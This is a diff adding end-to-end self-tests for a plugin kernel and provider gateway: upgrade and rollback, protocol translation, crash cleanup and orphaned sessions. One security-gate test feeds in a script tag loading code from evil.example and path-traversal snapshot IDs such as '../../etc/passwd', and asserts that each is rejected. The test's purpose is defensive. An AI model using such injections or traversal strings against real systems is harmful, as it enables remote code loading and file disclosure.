+    if (!line.trim()) return;
+    const msg = JSON.parse(line);
+    if (msg.id !== undefined && gwPending.has(msg.id)) {
+      const p = gwPending.get(msg.id);
+      gwPending.delete(msg.id);
+      if (msg.error) p.reject(new Error(msg.error.message)); else p.resolve(msg.result);
+    }
+  });
+  const gwRpc = (method, params = {}) => new Promise((resolve, reject) => {
+    const id = gwSeq++;
+    gwPending.set(id, {resolve, reject});
+    gw.stdin.write(JSON.stringify({id, method, params}) + "\n");
+  });
+
+  try {
+    // 1. P1 #7 安全门禁：禁止 host_plugin 导入 node:worker_threads，禁止非法 snapshotId 路径穿越与远程 Studio 脚本
+    const forbiddenVal = await callTool("solbraid_plugin_validate", {
+      manifest: {
+        manifestVersion: "1.0.0", apiVersion: ">=1.0.0 <2.0.0",
+        id: "local.escape.try", name: "越权导入", version: "0.1.0",
+        kind: "local", executionTier: "worker-isolated", entrypoint: "index.mjs",
+        capabilities: {required: [], optional: []},
+      },
+      files: {"index.mjs": `import {Worker} from "node:worker_threads";\nexport function activate() {}\n`},
+    });
+    assert.equal(forbiddenVal.data.ok, false);
+    assert.ok(forbiddenVal.data.securityFindings.some(f => f.ruleId === "FORBIDDEN_NODE_BUILTIN"));
+
+    const badStudioScript = await callTool("solbraid_studio_override", {
+      action: "apply", fileName: "artifact-renderer.js",
+      content: `document.write('<script src="https://evil.example/a.js"></script>');\n`,
+    });
+    assert.equal(badStudioScript.isError, true);
+
+    const badStudioSnap = await callTool("solbraid_studio_override", {
+      action: "rollback", fileName: "artifact-renderer.js", snapshotId: "../../etc/passwd",
+    });
+    assert.equal(badStudioSnap.isError, true);
+
+    // 2. P0 #3 依赖保留：升级与回滚不得删除插件目录下的 node_modules/ 与 package.json
+    const wireManifest = {
+      manifestVersion: "1.0.0", apiVersion: ">=1.0.0 <2.0.0",
+      id: "local.wire.e2e", name: "跨进程协议与依赖回归", version: "1.0.0",
+      kind: "local", executionTier: "worker-isolated", entrypoint: "index.mjs",
+      capabilities: {required: ["commands", "rpc", "provider.translator"], optional: []},
+    };
+    const wireCodeV1 = [
+      `export async function activate(ctx) {`,
+      `  ctx.commands.register("ver", { description: "版本", handler: () => ({kind: "notice", message: "V1"}) });`,
+      `  ctx.providers.registerTranslator({`,
+      `    id: "custom-wire", name: "自定义协议", baseProtocol: "openai_chat",`,
+      `    toUpstream: (req) => ({ path: "/v2/infer", headers: {"x-custom-wire": "wire-v1"}, body: {input: req} }),`,
+      `    fromUpstream: (res) => ({ choices: [{message: {role: "assistant", content: "TRANSLATED:" + (res.out || "")}}] }),`,
+      `  });`,
+      `}`,
+    ].join("\n");
+    const dep1 = await callTool("solbraid_plugin_apply", {
+      pluginId: "local.wire.e2e", manifest: wireManifest, files: {"index.mjs": wireCodeV1}, note: "v1",
+    });
+    assert.equal(dep1.data.ok, true);
+
+    const pluginDir = path.join(tmpHome, ".galiais", "plugins", "local.wire.e2e");
+    fs.mkdirSync(path.join(pluginDir, "node_modules", "demo-dep"), {recursive: true});
+    fs.writeFileSync(path.join(pluginDir, "node_modules", "demo-dep", "index.mjs"), "export const v = 42;\n", "utf8");
+    fs.writeFileSync(path.join(pluginDir, "package.json"), JSON.stringify({name: "local-wire-e2e", dependencies: {"demo-dep": "1.0.0"}}), "utf8");
+
+    const dep2 = await callTool("solbraid_plugin_apply", {
+      pluginId: "local.wire.e2e",
+      manifest: {...wireManifest, version: "1.1.0"},
+      files: {"index.mjs": wireCodeV1.replace('"V1"', '"V2"')},
+      note: "v1.1 升级",
+    });
+    assert.equal(dep2.data.ok, true);
+    assert.ok(fs.existsSync(path.join(pluginDir, "node_modules", "demo-dep", "index.mjs")), "node_modules must survive upgrade");
+    assert.ok(fs.existsSync(path.join(pluginDir, "package.json")), "package.json must survive upgrade");
+
+    const badSnapRollback = await callTool("solbraid_plugin_rollback", {pluginId: "local.wire.e2e", snapshotId: "../../evil"});
+    assert.equal(badSnapRollback.isError, true);
+
+    const rbOk = await callTool("solbraid_plugin_rollback", {pluginId: "local.wire.e2e", snapshotId: dep2.data.snapshotId});
+    assert.equal(rbOk.data.ok, true);
+    assert.ok(fs.existsSync(path.join(pluginDir, "node_modules", "demo-dep", "index.mjs")), "node_modules must survive rollback");
+    assert.ok(fs.existsSync(path.join(pluginDir, "package.json")), "package.json must survive rollback");
+
+    // 3. P0 #2 跨进程 HTTP E2E：真实 provider-gateway.mjs 经由 plugin-ctl 走 Codex / Claude / OpenAI Chat 三入口翻译
+    const gwInit = await gwRpc("initialize");
+    const gwBase = `http://127.0.0.1:${gwInit.port}`;
+    const gwHeaders = {Authorization: `Bearer ${gwInit.token}`, "Content-Type": "application/json"};
+    await gwRpc("providers/sync", {
+      providers: [{
+        id: "p_plug", name: "PluginWire", protocol: "plugin:custom-wire",
+        baseUrl: `http://127.0.0.1:${upPort}`, authMode: "none", enabled: true,
+      }],
+      routingGroups: [],
+    });
+
+    // 3a. Codex Responses SSE 入口
+    const rCodex = await fetch(`${gwBase}/openai-responses/p_plug/responses`, {
+      method: "POST", headers: gwHeaders,
+      body: JSON.stringify({model: "m1", stream: true, input: [{type: "message", role: "user", content: [{type: "input_text", text: "hi"}]}]}),
+    });
+    assert.equal(rCodex.status, 200);
+    const codexSse = await rCodex.text();
+    assert.ok(codexSse.includes("event: response.output_text.delta"), `Missing Responses delta SSE: ${codexSse}`);
+    assert.ok(codexSse.includes("TRANSLATED:UPSTREAM_OK:/v2/infer:wire-v1"));
+    assert.ok(codexSse.includes("event: response.completed"));
+
+    // 3b. Claude Messages 非流式 + 流式 SSE 入口
+    const rClaudeJson = await fetch(`${gwBase}/anthropic/p_plug/v1/messages`, {
+      method: "POST", headers: gwHeaders,
+      body: JSON.stringify({model: "claude-sonnet-4", stream: false, max_tokens: 32, messages: [{role: "user", content: "hi"}]}),
+    });
+    assert.equal(rClaudeJson.status, 200);
+    const claudeJson = await rClaudeJson.json();
+    assert.equal(claudeJson.content?.[0]?.text, "TRANSLATED:UPSTREAM_OK:/v2/infer:wire-v1");
+
+    const rClaudeSse = await fetch(`${gwBase}/anthropic/p_plug/v1/messages`, {
+      method: "POST", headers: gwHeaders,
+      body: JSON.stringify({model: "claude-sonnet-4", stream: true, max_tokens: 32, messages: [{role: "user", content: "hi"}]}),
+    });
+    assert.equal(rClaudeSse.status, 200);
+    const claudeSse = await rClaudeSse.text();
+    assert.ok(claudeSse.includes("event: content_block_delta"));
+    assert.ok(claudeSse.includes("TRANSLATED:UPSTREAM_OK:/v2/infer:wire-v1"));
+    assert.ok(claudeSse.includes("event: message_stop"));
+
+    // 3c. OpenAI Chat 兼容入口
+    const rChat = await fetch(`${gwBase}/openai-chat/p_plug/chat/completions`, {
+      method: "POST", headers: gwHeaders,
+      body: JSON.stringify({model: "m1", stream: false, messages: [{role: "user", content: "hi"}]}),
+    });
+    assert.equal(rChat.status, 200);
+    const chatJson = await rChat.json();
+    assert.equal(chatJson.choices?.[0]?.message?.content, "TRANSLATED:UPSTREAM_OK:/v2/infer:wire-v1");
+
+    // 4. P1 #6 Worker 运行期崩溃必须注销命令与 RPC（不留僵尸注册）
+    const crashLater = await callTool("solbraid_plugin_apply", {
+      pluginId: "local.worker.crasher",
+      manifest: {
+        manifestVersion: "1.0.0", apiVersion: ">=1.0.0 <2.0.0",
+        id: "local.worker.crasher", name: "运行期崩溃清理测试", version: "1.0.0",
+        kind: "local", executionTier: "worker-isolated", entrypoint: "index.mjs",
+        capabilities: {required: ["commands"], optional: []},
+      },
+      files: {
+        "index.mjs": [
+          `export function activate(ctx) {`,
+          `  ctx.commands.register("boom", { description: "触发异步崩溃", handler: () => { setTimeout(() => { throw new Error("async-worker-crash"); }, 20); return {kind: "notice", message: "armed"}; } });`,
+          `}`,
+        ].join("\n"),
+      },
+      note: "部署运行期崩溃测试插件",
+    });
+    assert.equal(crashLater.data.ok, true);
+    assert.ok(kernel.commands.has("local.worker.crasher:boom"));
+    await kernel.runCommand({pluginId: "local.worker.crasher", command: "boom"});
+    for (let i = 0; i < 30 && kernel.commands.has("local.worker.crasher:boom"); i++) {
+      await new Promise(r => setTimeout(r, 50));
+    }
+    assert.equal(kernel.commands.has("local.worker.crasher:boom"), false, "Crashed worker commands must be evicted");
+
+    // 5. P1 #7 Safe Mode 下 apply 不得误回滚合法新版本
+    await kernel.setSafeMode(true);
+    const safeApply = await callTool("solbraid_plugin_apply", {
+      pluginId: "local.wire.e2e",
+      manifest: {...wireManifest, version: "1.2.0"},
+      files: {"index.mjs": wireCodeV1.replace('"V1"', '"V12_SAFE"')},
+      note: "Safe Mode 离线升级",
+    });
+    assert.equal(safeApply.data.ok, true);
+    assert.equal(safeApply.data.rolledBack, false);
+    assert.equal(safeApply.data.safeModeSkipped, true);
+    const diskManifest = JSON.parse(fs.readFileSync(path.join(pluginDir, "solbraid-plugin.json"), "utf8"));
+    assert.equal(diskManifest.version, "1.2.0");
+  } finally {
+    gw.kill("SIGTERM");
+    upstream.close();
+    mcpProc.kill();
+    await ctlSrv.close();
+    await kernel.dispose();
+    fs.rmSync(tmpHome, {recursive: true, force: true});
+  }
+}
+
+async function testOrphanedHotPluginResourcesE2E() {
+  const tmpHome = fs.mkdtempSync(path.join(os.tmpdir(), "galiais-orphan-e2e-"));
+  const wsDir = path.join(tmpHome, "workspace");
+  fs.mkdirSync(wsDir, {recursive: true});
+
+  // 预置一个带点号驱动 ID（local.dot.driver）与自定义协议的 worker-isolated 插件
+  const plugDir = path.join(tmpHome, ".galiais", "plugins", "local.orphan.demo");
+  const snapDir = path.join(tmpHome, ".galiais", "plugins-snapshots", "local.orphan.demo");
+  fs.mkdirSync(plugDir, {recursive: true});
+  fs.mkdirSync(snapDir, {recursive: true});
+  fs.writeFileSync(path.join(snapDir, "dummy.txt"), "snap", "utf8");
+  fs.writeFileSync(path.join(plugDir, "solbraid-plugin.json"), JSON.stringify({
+    manifestVersion: "1.0.0",
+    apiVersion: ">=1.0.0 <2.0.0",
+    id: "local.orphan.demo",
+    name: "孤儿资源回归插件",
+    version: "1.0.0",
+    kind: "local",
+    executionTier: "worker-isolated",
+    entrypoint: "index.mjs",
+    capabilities: {required: ["agent.driver", "provider.translator"], optional: []},
+  }), "utf8");
+  fs.writeFileSync(path.join(plugDir, "index.mjs"), [
+    `export function activate(ctx) {`,
+    `  ctx.drivers.register({`,
+    `    id: "local.dot.driver",`,
+    `    name: "点号动态驱动",`,
+    `    protocol: "plugin-driver",`,
+    `    listModels: () => [{id: "dot-v1", label: "Dot v1"}],`,
+    `    execute: async ({prompt, emitChunk}) => {`,
+    `      emitChunk("DOT_OK:" + prompt);`,
+    `      return {stopReason: "end_turn"};`,
+    `    },`,
+    `  });`,
+    `  ctx.providers.registerTranslator({`,
+    `    id: "orphan-wire",`,
+    `    name: "即将卸载的协议",`,
+    `    baseProtocol: "openai_chat",`,
+    `    toUpstream: r => ({path: "/ok", body: r}),`,
+    `    fromUpstream: r => r,`,
+    `  });`,
+    `}`,
+  ].join("\n"), "utf8");
+
+  // 1. 拉起真实 agent-hub.mjs 子进程
+  const hubSockPath = process.platform === "win32"
+    ? `\\\\.\\pipe\\solbraid-orphan-hub-${process.pid}-${Date.now()}`
+    : path.join(tmpHome, ".galiais", "run", "plugin-ctl.sock");
+  const hub = spawn(process.execPath, [path.join(rootDir, "runtime", "agent-hub.mjs")], {
+    env: {...process.env, HOME: tmpHome, USERPROFILE: tmpHome, SOLBRAID_PLUGIN_CTL_SOCKET: hubSockPath},
+    stdio: ["pipe", "pipe", "pipe"],
+  });
+  const hubRl = createInterface({input: hub.stdout, crlfDelay: Infinity});
+  const hubPending = new Map();
+  const hubEvents = [];
+  let hubSeq = 1;
+  hubRl.on("line", line => {
+    if (!line.trim()) return;
+    const msg = JSON.parse(line);
+    if (msg.id !== undefined && hubPending.has(msg.id)) {
+      const p = hubPending.get(msg.id);
+      hubPending.delete(msg.id);
+      if (msg.error) p.reject(new Error(msg.error.message)); else p.resolve(msg.result);
+    } else if (msg.method) {
+      hubEvents.push(msg);
+    }
+  });
+  const hubRpc = (method, params = {}) => new Promise((resolve, reject) => {
+    const id = hubSeq++;
+    const timer = setTimeout(() => { hubPending.delete(id); reject(new Error(`hub RPC timeout: ${method}`)); }, 15_000);
+    hubPending.set(id, {
+      resolve: v => { clearTimeout(timer); resolve(v); },
+      reject: e => { clearTimeout(timer); reject(e); },
+    });
+    hub.stdin.write(JSON.stringify({id, method, params}) + "\n");
+  });
+
+  // 2. 模拟备份上游 + 拉起真实 provider-gateway.mjs 测试插件协议卸载后的路由组故障转移与直连报错
+  const backupSrv = http.createServer((_req, res) => {
+    res.writeHead(200, {"Content-Type": "application/json"});
+    res.end(JSON.stringify({
+      id: "msg_backup", type: "message", role: "assistant", model: "backup-m",
+      content: [{type: "text", text: "FAILOVER_TO_BACKUP_OK"}],
+      usage: {input_tokens: 10, output_tokens: 5},
+    }));
+  });
+  await new Promise(r => backupSrv.listen(0, "127.0.0.1", r));
+  const backupPort = backupSrv.address().port;
+
+  const sockPath = process.platform === "win32"
+    ? `\\\\.\\pipe\\solbraid-orphan-gw-${process.pid}-${Date.now()}`
+    : path.join(tmpHome, ".galiais", "run", "orphan-ctl.sock");
+  const tokenFile = path.join(tmpHome, ".galiais", "run", "orphan-ctl.token");
+  const gwKernel = new PluginKernel({home: tmpHome});
+  await gwKernel.boot();
+  const gwCtl = await startPluginControlServer(gwKernel, {socketPath: sockPath, tokenFile});
+
+  const gw = spawn(process.execPath, [path.join(rootDir, "runtime", "provider-gateway.mjs")], {
+    env: {
+      ...process.env,
+      HOME: tmpHome,
+      USERPROFILE: tmpHome,
+      SOLBRAID_PLUGIN_CTL_SOCKET: sockPath,
+      SOLBRAID_PLUGIN_CTL_TOKEN: gwCtl.token,
+    },
+    stdio: ["pipe", "pipe", "pipe"],
+  });
+  const gwRl = createInterface({input: gw.stdout, crlfDelay: Infinity});
+  const gwPending = new Map();
+  let gwSeq = 1;
+  gwRl.on("line", line => {
+    if (!line.trim()) return;
+    const msg = JSON.parse(line);
+    if (msg.id !== undefined && gwPending.has(msg.id)) {
+      const p = gwPending.get(msg.id);
+      gwPending.delete(msg.id);
+      if (msg.error) p.reject(new Error(msg.error.message)); else p.resolve(msg.result);
+    }
+  });
+  const gwRpc = (method, params = {}) => new Promise((resolve, reject) => {
+    const id = gwSeq++;
+    gwPending.set(id, {resolve, reject});
+    gw.stdin.write(JSON.stringify({id, method, params}) + "\n");
+  });
+
+  try {
+    await hubRpc("initialize");
+    // 用带点号的动态插件驱动创建会话并对话
+    const created = await hubRpc("sessions/create", {agentId: "local.dot.driver", cwd: wsDir});
+    const sid = created.session.id;
+    assert.equal(created.session.driverName, "点号动态驱动");
+    const prompted = await hubRpc("sessions/prompt", {agentId: "local.dot.driver", sessionId: sid, text: "hello"});
+    assert.equal(prompted.text, "DOT_OK:hello");
+
+    // 卸载热插件（同时验证快照目录被同步清理并广播 plugins/changed removed:true）
+    await hubRpc("plugins/removeLocal", {pluginId: "local.orphan.demo"});
+    assert.equal(fs.existsSync(snapDir), false, "snapshots dir must be removed on plugin uninstall");
+    assert.ok(hubEvents.some(e => e.method === "plugins/changed" && e.params?.pluginId === "local.orphan.demo" && e.params?.removed === true));
+
+    // 插件已卸载：历史会话依然可列表发现、可只读加载、可重命名、可安全中断、发送给清晰中文提示、可彻底删除并回收空目录！
+    const listed = await hubRpc("sessions/list", {});
+    const orphanSummary = listed.sessions.find(s => s.id === sid);
+    assert.ok(orphanSummary, "Orphaned session must still appear in sessions/list");
+    assert.equal(orphanSummary.driverName, "点号动态驱动");
+    assert.equal(orphanSummary.driverAvailable, false);
+
+    const loaded = await hubRpc("sessions/load", {agentId: "local.dot.driver", sessionId: sid});
+    assert.equal(loaded.session.driverAvailable, false);
+    assert.ok(loaded.session.messages.some(m => m.role === "agent" && m.text === "DOT_OK:hello"));
+
+    const renamed = await hubRpc("sessions/rename", {agentId: "local.dot.driver", sessionId: sid, title: "重命名后的历史会话"});
+    assert.equal(renamed.ok, true);
+
+    const cancelled = await hubRpc("sessions/cancel", {agentId: "local.dot.driver", sessionId: sid});
+    assert.equal(cancelled.ok, true);
+
+    await assert.rejects(
+      () => hubRpc("sessions/prompt", {agentId: "local.dot.driver", sessionId: sid, text: "again"}),
+      /已卸载、停用或处于安全模式/,
+    );
+
+    const deleted = await hubRpc("sessions/delete", {agentId: "local.dot.driver", sessionId: sid});
+    assert.equal(deleted.ok, true);
+    const sessionDir = path.join(tmpHome, ".galiais", "agent-sessions", "local.dot.driver");
+    assert.equal(fs.existsSync(sessionDir), false, "Empty orphaned session directory must be pruned after deleting last session");
+
+    // 验证 provider-gateway 在插件协议卸载后：路由组自动故障转移至健康备份节点，直连/ping/test 返回清晰中文提示
+    await gwKernel.removeLocalPlugin("local.orphan.demo").catch(() => {});
+    const gwInit = await gwRpc("initialize");
+    const gwBase = `http://127.0.0.1:${gwInit.port}`;
+    const gwHeaders = {Authorization: `Bearer ${gwInit.token}`, "Content-Type": "application/json"};
+    await gwRpc("providers/sync", {
+      providers: [
+        {id: "p_gone", name: "已卸载插件服务商", protocol: "plugin:orphan-wire", baseUrl: `http://127.0.0.1:${backupPort}`, authMode: "none", enabled: true, models: ["m1"]},
+        {id: "p_ok", name: "健康备份", protocol: "anthropic_messages", baseUrl: `http://127.0.0.1:${backupPort}`, authMode: "none", enabled: true, models: ["backup-m"]},
+      ],
+      routingGroups: [
+        {
+          id: "g_orphan_ha", name: "插件失效故障转移组", strategy: "failover",
+          targets: [
+            {providerId: "p_gone", model: "m1", weight: 1},
+            {providerId: "p_ok", model: "backup-m", weight: 1},
+          ],
+        },
+      ],
+    });
+
+    const rFailover = await fetch(`${gwBase}/anthropic/group_g_orphan_ha/v1/messages`, {
+      method: "POST", headers: gwHeaders,
+      body: JSON.stringify({model: "auto", stream: false, max_tokens: 16, messages: [{role: "user", content: "hi"}]}),
+    });
+    assert.equal(rFailover.status, 200);
+    const failoverJson = await rFailover.json();
+    assert.equal(failoverJson.content?.[0]?.text, "FAILOVER_TO_BACKUP_OK");
+
+    const rDirectGone = await fetch(`${gwBase}/anthropic/p_gone/v1/messages`, {
+      method: "POST", headers: gwHeaders,
+      body: JSON.stringify({model: "m1", stream: false, max_tokens: 16, messages: [{role: "user", content: "hi"}]}),
+    });
+    assert.equal(rDirectGone.status, 503);
+    const directGoneText = await rDirectGone.text();
+    assert.ok(directGoneText.includes("插件协议") && directGoneText.includes("orphan-wire"));
+
+    await assert.rejects(() => gwRpc("providers/test", {providerId: "p_gone"}), /插件协议.*未加载/);
+    await assert.rejects(() => gwRpc("providers/ping", {providerId: "p_gone", model: "m1"}), /插件协议.*不可用/);
+  } finally {
+    gw.kill("SIGTERM");
+    hub.kill("SIGTERM");
+    backupSrv.close();
+    await gwCtl.close();
+    await gwKernel.dispose();
+    fs.rmSync(tmpHome, {recursive: true, force: true});
+  }
+}
+
 await testProviderTranslators();
 await testUsageLedger();
 await testProviderGatewayE2E();
@@ -1151,4 +2111,8 @@ await testGuestMux();
 await testDevToolsAndDelegateMcp();
 await testPluginKernel();
 await testCommunityRegistryAndAiReviewer();
+await testSelfEvolvingPluginPipeline();
+await testPhase4CeilingCapabilities();
+await testAuditRegressionAndCrossProcessE2E();
+await testOrphanedHotPluginResourcesE2E();
 console.log("ALL_SELF_TESTS_PASSED");
